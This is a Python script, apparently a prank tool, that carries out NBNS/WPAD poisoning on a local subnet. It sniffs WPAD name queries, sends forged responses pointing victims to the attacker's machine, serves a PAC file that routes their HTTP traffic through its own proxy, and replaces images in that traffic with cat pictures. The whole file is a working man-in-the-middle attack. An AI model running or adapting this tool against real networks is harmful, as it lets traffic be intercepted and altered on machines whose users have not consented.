#! /usr/bin/env python

# jonathan is a naughty boy

import urlparse
import random

from twisted.internet import reactor, threads
from twisted.web import http, server, static, proxy

from socket import gethostname, gethostbyname

import scapy
from scapy.all import sniff, IP, UDP, NBNSQueryRequest, NBNSQueryResponse

scapy.config.verb = 0

my_ip = gethostbyname(gethostname())

pac_data = """
function FindProxyForURL(url, host) {
    if (host == "localhost" || host == "127.0.0.1") { return "DIRECT"; }
    if (shExpMatch(host, "localhost:*") || shExpMatch(host, "127.0.0.1:*")) { return "DIRECT"; }
    if (shExpMatch(url, "http:*")) return "PROXY %s:1337";
    return "DIRECT";
}
""" % my_ip

cats = 0

block_list = ["172.17.3.194"]


class MyProxyRequest(proxy.ProxyRequest):
    def __init__(self, channel, queued, reactor=reactor):
        proxy.ProxyRequest.__init__(self, channel, queued, reactor)

    def process(self):
        global cats
        print("[Proxy server] %s asked for: %s" % (self.getClientIP(), self.uri))

        if (self.uri.lower().endswith(".jpg") or self.uri.lower().endswith(".gif") or self.uri.lower().endswith(".png")):
            self.uri = random.choice(["http://i.imgur.com/xOVg2WM.jpg", "http://i.imgur.com/npIbfrW.jpg"])

            cats += 1

            parsed = urlparse.urlparse(self.uri)

            protocol = parsed[0]
            host = parsed[1]
            port = self.ports[protocol]

            self.setHost(host, port)

            print("[Proxy server] %d cats served to date" % cats)

        return proxy.ProxyRequest.process(self)


class MyProxy(http.HTTPChannel):
    requestFactory = MyProxyRequest


class MyProxyFactory(http.HTTPFactory):
    def __init__(self):
        http.HTTPFactory.__init__(self)
        self.protocol = MyProxy


class SingleResourceSite(server.Site):
    def __init__(self, data, type='text/html', logPath=None, timeout=60 * 60 * 12):
        server.Site.__init__(self, static.Data(data, type), logPath=logPath, timeout=timeout)

    def getResourceFor(self, request):
        if str(request.getClientIP()) in block_list:
            return None
        print("[PAC server] sent PAC to %s" % (request.getClientIP()))
        return self.resource


class NBNSListener():
    def run(self):
        sniff(filter='broadcast and udp port 137', prn=lambda x: NBNSListener.processPacket(self, x))

    def processPacket(self, pkt):
        global block_list
        if pkt[IP].src != my_ip and pkt.haslayer(NBNSQueryRequest):
            qreq = pkt[NBNSQueryRequest]
            if not qreq is None and "WPAD" in qreq.QUESTION_NAME.upper():
                if str(pkt[IP].src) not in block_list:
                    if '172.17.3.' in str(pkt[IP].src):
                        print('[NBNSListener] Poisoning %s for %s' % (pkt[IP].src, qreq.QUESTION_NAME))

                        qresp = NBNSQueryResponse()

                        qresp.NAME_TRN_ID = qreq.NAME_TRN_ID
                        qresp.RR_NAME = qreq.QUESTION_NAME
                        qresp.NB_ADDRESS = my_ip

                        scapy.all.send(IP(dst=pkt[IP].src) / UDP(dport=137) / qresp, verbose=1)


def main():

    pac = SingleResourceSite(pac_data, 'application/x-ns-proxy-autoconfig', timeout=None)

    print("Starting PAC server")
    reactor.listenTCP(80, pac)

    print("Starting proxy server")
    reactor.listenTCP(1337, MyProxyFactory())

    nbns = NBNSListener()
    threads.deferToThread(nbns.run)

    reactor.run()

    return 0

if __name__ == '__main__':
    import sys
    import argparse

    parser = argparse.ArgumentParser()

    sys.exit(main(**vars(parser.parse_args())))